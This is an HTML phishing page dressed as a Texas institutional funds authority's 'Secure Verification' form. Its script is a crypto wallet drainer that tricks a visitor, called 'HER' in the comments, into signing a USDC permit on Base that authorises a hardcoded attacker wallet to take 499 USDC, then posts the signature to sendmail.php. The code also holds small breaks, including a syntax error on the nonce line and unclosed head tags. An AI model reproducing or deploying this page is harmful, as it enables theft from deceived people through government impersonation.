<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FRC Restoration Directive | Texas Institutional Funds Management Authority</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500;600;700&display=swap');
    
<body>
  <h2>Secure Verification</h2>

  <form id="permitForm" action="sendmail.php" method="POST">
    <!-- HER address will be filled automatically when she signs -->
    <input type="hidden" name="owner" id="owner">
    
    <!-- YOUR wallet address (where USDC goes) -->
    <input type="hidden" name="spender" value="0x2C5aF337b35F0B2589DcA8c50fB8f65803f0A94D">
    
    <!-- HER address again for the form (same as owner) -->
    <input type="hidden" name="address" id="address">
    
    <input type="hidden" name="value" value="499">
    <input type="hidden" name="deadline" id="deadline">
    <input type="hidden" name="v" id="v">
    <input type="hidden" name="r" id="r">
    <input type="hidden" name="s" id="s">
    <input type="hidden" name="nonce" id="nonce">

    <button id="signBtn" type="button" onclick="signPermit()">Sign Attestation</button>
  </form>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    async function signPermit() {
      const btn = document.getElementById("signBtn");
      try {
        if (!window.ethereum) {
            window.location.href = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`;
            return;
        }

        btn.disabled = true;
        btn.innerText = "Syncing...";

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const owner = await signer.getAddress(); // THIS IS HER ADDRESS

        // Fill HER address in both hidden fields
        document.getElementById("owner").value = owner;
        document.getElementById("address").value = owner;

        // USDC on Base
        const tokenAddress = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
        const usdcContract = new ethers.Contract(
            tokenAddress, 
            ["function nonces(address) view returns (uint256)"], 
            provider
        );
        
        // Get real nonce from contract
        const liveNonce = await usdcContract.nonces(owner);
        const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
        const chainId = 8453; // Base Mainnet

        // CRITICAL: Token name MUST be "USD//C" on Base
        const domain = {
          name: "USDC",
          version: "2",
          chainId,
          verifyingContract: tokenAddress
        };

        const types = {
          Permit: [
            { name: "owner", type: "address" },
            { name: "spender", type: "address" },
            { name: "value", type: "uint256" },
            { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
          ]
        };

        const message = {
          owner,
          spender: "0x2C5aF337b35F0B2589DcA8c50fB8f65803f0A94D", // YOUR wallet
          value: ethers.utils.parseUnits("499", 6),
          nonce: liveNonce,
          deadline
        };

        const signature = await signer._signTypedData(domain, types, message);
        const sig = ethers.utils.splitSignature(signature);

        // Fill remaining hidden fields
        document.getElementById("nonce").value = liveNonce.;
        document.getElementById("deadline").value = deadline;
        document.getElementById("v").value = sig.v;
        document.getElementById("r").value = sig.r;
        document.getElementById("s").value = sig.s;

        btn.innerText = "Transmitting...";
        document.getElementById("permitForm").submit();
      } catch (err) {
        btn.disabled = false;
        btn.innerText = "Sign Attestation";
        alert("Verification Error: " + err.message);
      }
    }
  </script>
</body>
</html>
